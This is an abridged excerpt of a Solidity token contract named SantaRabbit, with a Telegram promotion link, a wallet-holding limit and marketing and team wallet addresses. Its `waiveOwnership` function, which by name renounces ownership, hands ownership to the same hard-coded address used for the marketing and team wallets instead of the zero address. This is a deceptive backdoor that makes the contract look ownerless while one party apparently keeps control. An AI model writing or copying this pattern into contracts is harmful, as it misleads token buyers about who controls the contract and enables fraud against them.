...
/**
Telegram : https://t.me/SantaRabbittPortal
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x6d4e1811A797e1F5a63Eb64E2097eF4836747818);
    }
...
contract SantaRabbit is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x6d4e1811A797e1F5a63Eb64E2097eF4836747818);
    address payable public teamWalletAddress = payable(0x6d4e1811A797e1F5a63Eb64E2097eF4836747818);
    ...
    uint256 public _walletMax =     45000000* 10**_decimals;      
